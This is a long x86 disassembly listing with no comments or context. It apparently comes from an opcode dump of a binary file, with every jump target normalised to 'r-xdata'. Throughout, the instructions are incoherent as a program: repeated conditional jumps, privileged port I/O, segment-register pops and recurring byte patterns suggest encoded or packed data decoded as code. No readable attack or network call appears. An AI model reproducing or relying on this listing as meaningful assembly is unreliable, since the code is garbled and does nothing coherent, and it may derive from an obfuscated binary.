push 0xffffffae
adc ecx [ edx ]
int3
cmpsb [ esi ] [ edi ]
salc
jae r-xdata
add eax 0x601c1c1b
cmp ah ch
jae r-xdata
and eax 0xd1f0ae1
pushad
sar [ edx + 0x68e26887 ] cl
xchg [ edi ] bl
sbb ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
push 0xffffffbe
jecxz r-xdata
jae r-xdata
pop ds
fucomi st6
push 0xa10d813
out 0xec eax
jae r-xdata
jae r-xdata
jae r-xdata
pushad
jae r-xdata
jae r-xdata
sbb al 0x1c
cmpsb [ esi ] [ edi ]
jae r-xdata
pop edx
jae r-xdata
jae r-xdata
mov [ 0x1fa66aeb ] eax
or dl cl
xor eax 0x73731c1c
mov ebx edx
mov edx 0x68e26887
sub ecx esp
jecxz r-xdata
jae r-xdata
jae r-xdata
daa
pushad
lahf
mov bl 0x68
and eax 0x1c164a0b
sbb al 0x60
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
or eax 0x661c1c1b
in al dx
jae r-xdata
pushad
sbb al 0x1c
jae r-xdata
in al dx
jae r-xdata
sbb al 0x60
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
out dx eax
test [ edx - 0x42 ] ebp
jae r-xdata
mov ah 0xb3
jae r-xdata
xchg ebp eax
push 0x19600a1b
sbb al 0x1c
sbb edx ebp
in al dx
loope r-xdata
retn
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
mov edx 0xaa323d0
xchg esp esi
jecxz r-xdata
jae r-xdata
jae r-xdata
fsub [ esi - 0x2f9813e5 ]
mul bl
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0x8b
jae r-xdata
jae r-xdata
add eax 0x601c1c1b
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xor al 0xa
jae r-xdata
jae r-xdata
daa
sbb al 0x1c
jae r-xdata
mov esi 0xa3a68ef
jae r-xdata
sbb ecx [ ebx - 0x1c1c1d19 ]
jae r-xdata
or bl [ edi ]
jae r-xdata
in al dx
inc dx
sti
jecxz r-xdata
jae r-xdata
push ebp
adc [ esp + ebx ] ebx
xchg [ edi ] bl
jecxz r-xdata
pushad
mov dh 0xa
loope r-xdata
sbb al 0xb
jae r-xdata
push 0x20d8efa6
push 0xec1c663b
jae r-xdata
pushad
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
pop ds
jae r-xdata
jae r-xdata
push 0xffffffee
jae r-xdata
or dl [ ecx + 0x37 ]
out dx eax
fsub [ eax ]
jae r-xdata
sbb al 0x1c
jmp r-xdata
jae r-xdata
jae r-xdata
push 0xfec40a3a
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb eax 0xb361ecc3
sbb [ esp + ebx ] bl
or edx [ edi ]
cli
jecxz r-xdata
sbb al 0x93
out dx eax
sbb al 0x93
jmp r-xdata
push 0x73202a22
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push ds
sbb al 0x1c
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and ecx [ edx ]
mov ah cl
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x34
jae r-xdata
jae r-xdata
in al dx
and [ edx ] cl
jae r-xdata
jae r-xdata
jae r-xdata
cmp eax 0x1c326e0a
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
push 0x18d60b1b
jae r-xdata
jecxz r-xdata
sbb al 0x1c
sbb [ esp + ebx ] bl
jae r-xdata
jecxz r-xdata
in al dx
and bp sp
jpe r-xdata
jae r-xdata
pop ds
jae r-xdata
mov bl 0x1c
or ch [ edx - 0x12 ]
jae r-xdata
jae r-xdata
push ecx
aaa
jae r-xdata
jae r-xdata
mov ebx esp
jae r-xdata
sbb al 0xa6
in al dx
popad
mov bl 0x18
sbb al 0x1c
push 0xe2e78b1b
outsb
jcxz r-xdata
sbb [ esp + ebx ] bl
or edx esi
jae r-xdata
shr [ edx ] 0x1
jae r-xdata
jae r-xdata
out dx eax
jae r-xdata
dec eax
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
cmp ah ch
sbb al 0x66
jae r-xdata
outsb
out dx al
jae r-xdata
cmp cl [ edx ]
jae r-xdata
push 0x326e0a3d
sbb al 0x1c
mov [ 0xffffffffe3e70f0a ] eax
jae r-xdata
enter 0x20e2 0x73
jae r-xdata
mov esp ebx
jae r-xdata
out dx eax
jae r-xdata
sti
jpo r-xdata
or dh [ 0x73e3e3f2 ]
pushad
jae r-xdata
sbb ebx [ esi ]
jae r-xdata
sbb bl [ esp + ebx ]
mov ecx [ esi ]
sbb [ eax - 0x5ef44a8b ] al
sbb [ esp + ebx ] bl
mov ecx [ eax - 0x4a5e5e17 ]
rcr [ edx ] 0x1
sbb al 0x1c
jecxz r-xdata
jae r-xdata
or dh [ edi - 0x14 ]
jecxz r-xdata
jae r-xdata
push cx
mov ecx 0x6a858089
push 0xec156613
or edx eax
sbb bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
daa
sbb al 0x60
jae r-xdata
or [ ecx ] 0xffffffe3
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
out 0x8b eax
jecxz r-xdata
jae r-xdata
xor bl [ esp + ebx ]
jae r-xdata
sbb al 0x96
jmp r-xdata
or esp [ esi + 0x5 ]
sbb al 0x1c
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jmp r-xdata
leave
jecxz r-xdata
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
mov dh 0x68
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb
inc ebx
in al dx
jecxz r-xdata
add [ esp + ebx ] bl
jecxz r-xdata
jae r-xdata
xchg esi eax
out dx eax
sbb al 0x73
jg r-xdata
xor bl [ esp + ebx ]
or ch [ esi + 0x731c1c33 ]
mov edi esp
mov esp ebx
shl ebx cl
add eax 0x766e1c1c
adc ebx [ eax ]
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xec1c663b
shl [ ebx ] 0x1
outsb
or cl [ eax + 0x1 ]
jecxz r-xdata
sbb al 0xb5
jmp r-xdata
iretd
fwait
loope r-xdata
mul ebx
jecxz r-xdata
push ebx
cmp al 0x1c
sbb al 0x60
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
outsb
outsb
adc ebx [ eax ]
jecxz r-xdata
mov [ ebx - 0x1c18f0f6 ] esp
jae r-xdata
pushad
sahf
pop ds
jecxz r-xdata
or edi [ ebp - 0x451c1c18 ]
mov edx 0x67ec2366
mov bl 0x32
movsd [ di ] [ si ]
xor bl [ esp + ebx ]
sbb al 0x96
pop ds
mov bl 0xa
jbe r-xdata
sbb al 0x6e
jae r-xdata
jae r-xdata
outsd
jecxz r-xdata
dec edi
jae r-xdata
daa
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
loop r-xdata
punpckldq mmx1 [ edi ]
outsd
out 0xe3 eax
jecxz r-xdata
or cl [ edi ]
jae r-xdata
jne r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata

jae r-xdata
loopne r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
pushad
jae r-xdata
jae r-xdata
mov ah 0xa
out 0xe3 eax
sbb al 0x1c
mov edx 0xec2366ba
mov bl 0x32
mov edx 0x13ae6a85
or cl ah
xor eax 0x6e731c1c
sub bx [ esi ]
jae r-xdata
jae r-xdata
dec ebx
and bl 0xe3
and al 0xa7
jae r-xdata
daa
test [ edx ] 0x1c1c1fcf
jae r-xdata
jae r-xdata
jecxz r-xdata
jne r-xdata
mov edx 0x7a1c1c7d
jecxz r-xdata
outsb
jae r-xdata
mul [ esi + 0x23 ]
or dl bh
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
cmc
push 0xa66a8521
sti
or dl [ ebp + 0x731c1c32 ]
jae r-xdata
mov [ ecx + edi * 4 + 0x6a858089 ] ecx
sbb al 0x1c
jae r-xdata
jae r-xdata
xchg esi eax
or ebx [ esp + esi * 2 ]
jpo r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
fsub [ eax ]
in al dx
adc al 0x1a
mov ah 0xb1
jae r-xdata
jae r-xdata
pop edx
sbb al 0xe3
jecxz r-xdata
mov edx 0x7a1c1c7d
jae r-xdata
push 0x1ce38913
and ecx [ edx ]
jae r-xdata
add [ esp + ebx ] ebx
jae r-xdata
scasb [ edi ]
xor ebx [ esp + ebx ]
jae r-xdata
sbb al 0x97
jae r-xdata
jae r-xdata
or bh [ ecx + 0x39 ]
sbb al 0x1c
jae r-xdata
out 0x8b eax
jecxz r-xdata
sbb al 0x1c
jae r-xdata
outsb
jae r-xdata
jae r-xdata
fsub [ esi + 0x35d70aeb ]
sbb al 0x1c
jae r-xdata
and [ edx ] ecx
or cl [ ebx - 0x1a ]
jecxz r-xdata
or ch dl
jmp ebx
jecxz r-xdata
jae r-xdata
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
xlat
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
pop ds
or cl [ edi ]
jmp 0x73ba2621
jae r-xdata
jae r-xdata
jae r-xdata
cmp [ esp + ebx ] ebx
jae r-xdata
jecxz r-xdata
or ebx esp
jecxz r-xdata
jecxz r-xdata
fidivr [ esi - 0x76981311 ]
retn
jae r-xdata
sbb al 0xa7
jecxz r-xdata
and esi [ ebx - 0x764a1d77 ]
jae r-xdata
jae r-xdata
push 0x9d0abc22
pop es
sbb al 0x1c
in al 0xe3
jecxz r-xdata
and ah ch
sbb al 0x73
jae r-xdata
jae r-xdata
sbb eax 0xab51c1c
mov eax 0x7373202a
jae r-xdata
out 0x1c eax
cmpsd [ esi ] [ edi ]
push 0xe0610a0f
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
nop [ ebx + esi * 2 ] ebx
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0xa
xor eax 0x73e3e3f2
jae r-xdata
jae r-xdata
jae r-xdata
or edx [ esi ]
jae r-xdata
jecxz r-xdata
mov ch 0x9b
jae r-xdata
jae r-xdata
outsb
sbb al 0x73
jae r-xdata
mov esp ebx
jecxz r-xdata
mov edi 0x67ecf7c7
outsd
or bl [ ebx + 0x73e3e3e1 ]
loop r-xdata
jae r-xdata
jmp ebx
jecxz r-xdata
loopne r-xdata
mov edx esp
jae r-xdata
or al [ ebp + ebx + 0x1c ]
jae r-xdata
jae r-xdata
jae r-xdata
jmp edx
jae r-xdata
sbb al 0x73
or al [ ebp + ebx + 0x1c ]
jae r-xdata
pop ebp
out 0xe3 eax
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
mov bl 0x89
jae r-xdata
mov eax 0xae3e3e2
jae r-xdata
and bh [ edx + ecx + 0x1c1c079d ]
jae r-xdata
jecxz r-xdata
mov bl 0x89
loope r-xdata
jae r-xdata
imul ebp ebx 0x68
cmpsb [ esi ] [ edi ]
pop ds
mov [ 0xa1fa66a ] eax
add eax 0x731c1c0c
daa
jae r-xdata
jae r-xdata
sbb al 0x97
cmp eax 0x27601c1c
out dx eax
mov esp ebx
arpl bx sp
jecxz r-xdata
jae r-xdata
or bl dl
cmp ebx [ esp + ebx ]
fwait
imul esp edi 0xffffffda
shl [ ecx ] 0x1
push 0xf3961422
movsd [ edi ] [ esi ]
xor [ edx ] cx
stc
jae r-xdata
push ebp
jae r-xdata
jae r-xdata
out dx eax
in al dx
mov ebx eax
jecxz r-xdata
or cl [ esi + 0x73e3e3f0 ]
jae r-xdata
or [ 0x480a1c1c ] 0xe3f2
jae r-xdata
or [ ds : esp + ebx ] ebx
bound bx [ 0xab51c1c ]
mov ch 0x89
jae r-xdata
xchg edi eax
jae r-xdata
sbb eax 0x73731c1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
jae r-xdata
inc esp
jae r-xdata
loope r-xdata
sub ch ah
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x75
mov eax esp
loop r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
push esp
das
cmp eax 0x1c40348e
jae r-xdata
jae r-xdata
or ah bl
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ds
loop r-xdata
aaa
jae r-xdata
scasb [ edi ]
pop ds
mov dl 0xb3
mov ecx esp
mov edi [ 0x1c40348e ]
jae r-xdata
sbb al 0x96
lea eax [ ebp - 0x5c385896 ]
jae r-xdata
stosd [ edi ]
jae r-xdata
or eax 0x480a1c1c
jae r-xdata
jae r-xdata
sti
jae r-xdata
jae r-xdata
or ah [ eax + 0x1d ]
sbb al 0x1c
jae r-xdata
mov ch 0x97
jae r-xdata
jae r-xdata
jae r-xdata
or [ 0x480a1c1c ] 0x73e3e3f2
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
xor eax [ bp + di ]
sub ch ah
jae r-xdata
mov dl 0xb3
test [ edx - 0x59 ] ebp
jae r-xdata
mov ax 0xe3e2
jecxz r-xdata
movsb [ edi ] [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
fiadd [ ebx - 0x131c1cf7 ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
outsb
sub bx [ esi ]
pushad
push 0xffffffa7
jae r-xdata
mov bl 0x85
push 0xffffffa7
mov ah 0xb0
sbb al 0x75
jae r-xdata
jecxz r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
or al [ esi + 0x5 ]
jae r-xdata
sbb al 0xb5
jae r-xdata
jae r-xdata
jae r-xdata
out 0x6e eax
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x97
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push 0xffffffa7
jae r-xdata
pop di
sbb [ esp + ebx ] ebx
or dl [ ebx + 0x731c1c36 ]
jae r-xdata
cmpsb [ esi ] [ edi ]
mov edi esp
cmpsd [ esi ] [ edi ]
sar ebx cl
or cl [ edx + ebx + 0x1c ]
sbb al 0x73
bound ecx [ edi ]
in al dx
jae r-xdata
psllq mm4 mm7
mov al 0x1c
jne r-xdata
dec ebx
out 0xe3 al
jecxz r-xdata
ror [ edx ] cl
pop es
jae r-xdata
sbb al 0x1c
mov bl 0x1c
sub ebx [ esi ]
mov edx 0xec2366bc
jl r-xdata
cld
mov ebx edx
or al [ edi ]
jae r-xdata
sbb al 0x1c
or cl cl
sbb [ esp + ebx ] bl
mov [ ebx + 0x1fa66a85 ] ebx
test [ edx - 0x52 ] ebp
adc eax 0x7a66eba
mov bl 0xa
and edi esi
jecxz r-xdata
sub ebx [ esi ]
jae r-xdata
jae r-xdata
test [ edx - 0x59 ] ebp
jae r-xdata
dec eax
jae r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
jae r-xdata
add eax 0x73731c1c
jae r-xdata
xchg edi eax
jae r-xdata
or cl [ eax - 0xe ]
jae r-xdata
jae r-xdata
inc esi
jae r-xdata
and ebp esp
jae r-xdata
sbb al 0x1c
xor eax [ ebx ]
jae r-xdata
jecxz r-xdata
adc ecx [ ecx - 0x644ae31d ]
sbb al 0x1c
or esi [ ebx + 0x5 ]
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
or esi [ ebx + 0x6f6e6eb5 ]
push ds
sbb al 0x1c
or esp [ esi + 0x5 ]
sbb al 0x1c
mov edx 0x4930aba
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ebx 0x6a85e289
cmpsd [ esi ] [ edi ]
in al dx
cmpsd [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
outsb
cmp edi eax
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sub [ esp + ebx ] bh
jae r-xdata
jae r-xdata
pushad
lahf
sbb [ esp + ebx ] ebx
jecxz r-xdata
in al dx
jae r-xdata
arpl bx sp
mov [ 0xffffffff85e289bb ] eax
push 0xffffffa7
jae r-xdata
mov al [ 0xfffffffff365ecfb ]
jae r-xdata
jae r-xdata
outsb
sbb al 0xb
jae r-xdata
jae r-xdata
jae r-xdata
outsb
jecxz r-xdata
jae r-xdata
mov eax 0x7373202a
sbb al 0x6e
cmp al 0x1c
jae r-xdata
pushad
sahf
jae r-xdata
cmpsd [ esi ] [ edi ]
out dx eax
jg r-xdata
and bp sp
pop si
cmpsd [ esi ] [ edi ]
pushad
xchg edi eax
jecxz r-xdata
in al dx
jae r-xdata
add [ esp + ebx ] bl
fisub [ eax - 0xc9a1305 ]
jae r-xdata
add eax 0x68e3e3ef
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
push 0x63681ba6
jae r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
push 0xd00aebae
push ds
sbb al 0x1c
mov edx [ esi ]
sbb al 0x1c
jae r-xdata
mov ah 0xb3
push ebx
push ds
sbb al 0x1c
or ebp [ edx ]
sbb al 0x1c
and bp sp
adc ax 0x9e0a
adc eax 0x73731c1c
sti
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
push 0xffffffa6
pop ds
pushad
cmpsb [ esi ] [ edi ]
pop ds
out 0xec eax
push esp
in al dx
cmp eax 0x6e1c1c0e
outsb
jae r-xdata
pop es
mov bl 0x68
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
inc edi
sbb ebp [ eax + 0x63 ]
jae r-xdata
sahf
sub ecx [ edx ]
push ebx
cmp al 0x1c
sbb al 0x73
jae r-xdata
jae r-xdata
scasb [ edi ]
jmp r-xdata
in al dx
and eax 0x6e1c1c03
adc bx [ eax ]
sbb al 0x1c
or eax [ 0x68e3e3ef ]
and esp [ ebx + 0x7373202a ]
jae r-xdata
adc al 0x3b
clc
mov ah 0x97
jae r-xdata
in al dx
jae r-xdata
mov dl 0x1c
xchg esi eax
and ecx [ edx ]
in eax 0x1b
sbb al 0x1c
add [ gs : esp + ebx ] bl
test [ esi + 0x15 ] esp
or bl [ esi + 0x731c1c15 ]
pop ds
mov bl 0xa
dec esp
outsb
and eax 0x1c0df20b
jae r-xdata
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
or ah ch
sbb ebx [ esp + ebx ]
out dx al
and ebp ebx
arpl [ edi - 0x1d ] ax
jecxz r-xdata
jae r-xdata
or dl [ ebx + 0x3c ]
sbb al 0x1c
mov al 0xa
cmp bh bh
jecxz r-xdata
or ah [ ebx + ebp * 8 + 0x66ece3e3 ]
jae r-xdata
push 0xffffff9e
jae r-xdata
sbb al 0x1c
xor al 0x3
jae r-xdata
in al dx
mov dh 0xa
cmpsb [ esi ] [ edi ]
cmp [ esp + ebx ] bl
out 0xe3 al
or ch dh
jae r-xdata
or eax 0xef0a1c1c
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
pushad
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffff9e
pop ds
sbb al 0xb5
jmp r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
jae r-xdata
jae r-xdata
and ebp ecx
outsb
cmpsd [ esi ] [ edi ]
shl [ ebx ] 0x1
push 0xffffffa7
jae r-xdata
sbb al 0x1c
jae r-xdata
push 0xdf20b25
jae r-xdata
jae r-xdata
jae r-xdata
mov edi esp
jecxz r-xdata
jae r-xdata
jae r-xdata
je r-xdata
push 0xb5b0b20f
and [ ecx ] ecx
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
push 0xffffffa6
jae r-xdata
jecxz r-xdata
jae r-xdata
or ch bh
jae r-xdata
or esi edx
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
xor eax 0x961c1c1c
pop ss
sbb al 0xb4
mov bl 0x89
sbb al 0xa

jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
or al [ eax - 0x1b ]
jecxz r-xdata
sbb al 0x1c
or ch dl
cmp eax 0x73731c1c
sbb al 0x1c
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
push 0xef0f600f
jae r-xdata
adc eax 0x85bb8689
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
or eax 0xef0a1c1c
jae r-xdata
mov bl 0x1c
xchg esi eax
pop es
sbb al 0xb4
push 0xffffffa6
pop ss
or bl [ esi - 0x49e3e3d4 ]
or al [ ecx + 0x3c ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
adc ebx [ esp + ebx ]
xchg esp eax
adc [ ecx + 0x57a62486 ] 0xbb
xchg [ ebp + 0x5ba624b5 ] cl
jae r-xdata
jae r-xdata
sbb al 0xb3
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ah 0xb
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ecx 0x720a8c89
aaa
jae r-xdata
jae r-xdata
sahf
out dx eax
jecxz r-xdata
out dx eax
jecxz r-xdata
jae r-xdata
pushad
pxor mmx1 [ ecx + 0xd310aeb ]
sbb al 0x1c
jae r-xdata
jae r-xdata
xor ebp esp
push esp
pushad
and ah cl
or cl [ edx + 0x731c1c15 ]
jae r-xdata
sub bh ch
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0xa
jae r-xdata
mov bl 0x6a
jae r-xdata
cli
mov [ edx + ecx ] ebx
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ edx ] cl
jno r-xdata
jpe r-xdata
sahf
sbb al 0x96
jae r-xdata
aas
jae r-xdata
mov ebx esi
outsb
daa
mov bl 0xa
mov ecx 0x731c1c18
jae r-xdata
das
and al 0xa6
jae r-xdata
lahf
jae r-xdata
jae r-xdata
mov [ edx ] cs
jae r-xdata
movsb [ edi ] [ esi ]
jae r-xdata
out dx eax
int3
cld
jae r-xdata
jecxz r-xdata
jae r-xdata
or ah [ edi + ebp * 8 + 0x6e73e3e3 ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
xor esi [ ebx + 0x1c14060a ]
sbb al 0x73
jae r-xdata
sbb al 0x1c
adc [ esp + ebx ] bl
adc ch [ edi ]
sbb al 0x1c
mov edx 0x66ec2366
pop esi
xor al 0x3
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
dec ecx
jmp 0xffffffff88ba2984
imul edx [ ebx - 0x1d ] 0xffffffe3
jae r-xdata
add eax 0xf5810abb
jecxz r-xdata
sbb eax [ ebp + 0xa1b9e6a ]
sub cl [ edx ]
jae r-xdata
in al dx
sbb al 0x1c
jae r-xdata
jmp r-xdata
xchg esi eax
sbb al 0x1c
mov esp ebx
jecxz r-xdata
push 0xffffff9e
jae r-xdata
jae r-xdata
jecxz r-xdata
mov esi 0xeb280a3b
jae r-xdata
sub bl ch
or esi [ edi ]
mov bl 0x1c
jae r-xdata
mov edx 0x6a85bb89
cmpsb [ esi ] [ edi ]
pop ss
test [ edx - 0x52 ] ebp
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
sbb al 0x73
sbb al 0x1c
jb r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
and edi [ ebp + 0x73202ab8 ]
outsb
jae r-xdata
add ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
mov eax 0x7373202a
sub ah [ eax ]
jae r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
or bl [ eax + 0x731c1c30 ]
jae r-xdata
or dh [ ecx + 0xf ]
outsb
cmpsb [ esi ] [ edi ]
cmp esi [ ebx + 0x6a3f961c ]
jae r-xdata
sbb al 0x1c
mov [ ebx - 0x7a5b7647 ] ebx
push 0xffffffb6
jns r-xdata
push ds
lahf
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
xor esi [ ebp + 0x3a260bb3 ]
sbb al 0x1c
mov ch 0x8b
adc bh dh
mov ah [ ebx - 0x1cd8abe4 ]
jecxz r-xdata

or ch [ eax ]
jae r-xdata
jae r-xdata
scasb [ edi ]
scasb [ edi ]
jae r-xdata
mov bl 0x1c
je r-xdata
xchg di ax
sbb [ esp + ebx ] bl
jae r-xdata
sbb al 0x1c
jecxz r-xdata
mov bl 0x6e
jae r-xdata
jae r-xdata
jae r-xdata
scasb [ edi ]
jae r-xdata
jae r-xdata
out 0xa eax
movsb [ edi ] [ esi ]
in al dx
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
sahf
pop ds
in al dx
sbb al 0xf0
jecxz r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
sub esi [ ebx - 0x5f5e377 ]
jae r-xdata
sbb al 0xd0
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
dec edi
push 0xab3eb96
mov dh 0x41
jae r-xdata
jae r-xdata
mov ah 0xb3
mov esp 0x73202abd
jae r-xdata
sbb al 0xb4
mov bl 0xbc
mov ebp 0x7373202a
jae r-xdata
mov ecx 0x45ae6a85
mov [ esi + 0x7fb66a85 ] edx
mov ecx 0x7db66a85
test [ edx - 0x5a ] ebp
dec ecx
push 0x8923d035
xchg edi eax
test [ edx - 0x4a ] ebp
inc ecx
jae r-xdata
pushad
jae r-xdata
jmp r-xdata
jae r-xdata
outsb
mov ebx 0xf710a86
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
pop edi
jecxz r-xdata
daa
fisttp [ edx ]
inc ebp
xor eax 0x6a851c1c
scasb [ edi ]
cmpsb [ esi ] [ edi ]
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata

jae r-xdata
jae r-xdata
mov ah 0xb0
mov ah 0x89
sbb al 0xa
0x731c1c3d 0x7373
jae r-xdata
jae r-xdata
and ebp [ edx ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and edi [ ebp + edi * 4 + 0x73202ab8 ]
jae r-xdata
test [ esi + 0x2a ] esp
push 0xffffffbe
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb3
jae r-xdata
cwde
xor [ esp + ebx ] bl
sub cl [ edx ]
jae r-xdata
cmp ecx [ edx ]
fwait
push ds
sbb al 0x1c
mov al 0xb3
or al dh
call 0x73ba2bc4
sbb al 0x74
or esp ebx
jecxz r-xdata
jae r-xdata
shl [ ebx ] 0x1
mov ebp 0x73202ab8
jae r-xdata
jae r-xdata
or bl [ eax - 0x5 ]
jecxz r-xdata
sbb al 0x1c
or ah [ ebx + 0x731c1c10 ]
mov [ ebx + 0x17a66a85 ] edi
jae r-xdata
jae r-xdata
jae r-xdata
or bh dl
and [ ebx + 0x73 ] dh
pushad
mov esp ebx
shl ebx cl
jecxz r-xdata
jae r-xdata
pop ds
or al [ ebp + 0x7373e3e3 ]
jae r-xdata
pop ss
push 0xffffff9e
insd
or al 0x1c
sbb al 0xb2
sbb al 0x96
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
mov edx ebp
jecxz r-xdata
mov bl 0xa
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
outsb
jae r-xdata
test [ edx - 0x5a ] ebp
push 0xffffffae
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + 0x731c1c16 ]
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb esp eax
scasb [ edi ]
pop ds
xor esp edx
loop r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x6e
sahf
cmp ebp [ esi + 0x6e ]
push ebx
push ds
sbb al 0x1c
or ebx [ ecx ]
sub ebx [ esp + ebx ]
and bp sp
pop ds
cmp [ esp + ebx ] ebx
or bh [ eax + 0x731c1c33 ]
jae r-xdata
sub bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and bp sp
or esi ebx
jae r-xdata
jae r-xdata
add esi [ ebx + 0x1897666e ]
sbb al 0x1c
sub edx [ ecx + 0x24aeb586 ]
and al 0xa6
inc ebp
jae r-xdata
or edx eax
and ecx [ edx ]
inc eax
in eax 0xe3
jecxz r-xdata
jae r-xdata
mov dl 0xb0
jae r-xdata
xchg edi eax
adc al 0x1c
mov ebx eax
test [ edx - 0x5a ] ebp
sar [ eax ] 0x1
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
in al dx
jne r-xdata
or ah [ ecx + 0x16 ]
jae r-xdata
jae r-xdata
jae r-xdata
sub bl [ esp + ebx ]
jae r-xdata
jae r-xdata
dec ebp
push 0x2fa66e2d
test [ edx - 0x6a ] ebp
push 0xffffffa6
mov ebx ebp
sbb al 0x1c
shr [ edx ] 0x1
mov [ 0xab42bc8 ] al
push edi
sbb al 0x1c
mov dh 0x68
punpcklbw mmx1 [ edi ]
out dx eax
mov ch 0xb4
or esp ebx
jae r-xdata
jecxz r-xdata
[ eax - 0x53 ]
jecxz r-xdata
push esp
jae r-xdata
mov esp 0xa2366bd
push ebp
fmul [ ebx ]
